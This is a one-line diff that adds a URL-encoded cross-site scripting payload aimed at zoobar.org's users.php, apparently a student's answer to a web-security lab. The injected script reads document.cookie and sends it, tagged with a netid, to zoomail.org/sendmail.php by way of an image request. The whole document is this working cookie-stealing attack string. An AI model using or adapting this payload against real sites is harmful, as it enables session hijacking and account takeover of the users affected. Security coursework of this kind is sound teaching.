@@ -1,0 +1,1 @@
+http://zoobar.org/users.php?user=%5C%22%20size%3D10%5C%3E%5C%3Cscript%5C%3E%28new%20Image%28%29%29.src%3D%27http%3A%2F%2Fzoomail.org%2Fsendmail.php%3F%27%2B%27%26netid%3Dedydfang%27%2B%27%26payload%3D%27%2Bdocument.cookie%2B%27%26random%3D%27%2BMath.random%28%29%3B%5C%3C%2Fscript%5C%3E%5C%3Cinput%20type%3D%5C%22hidden
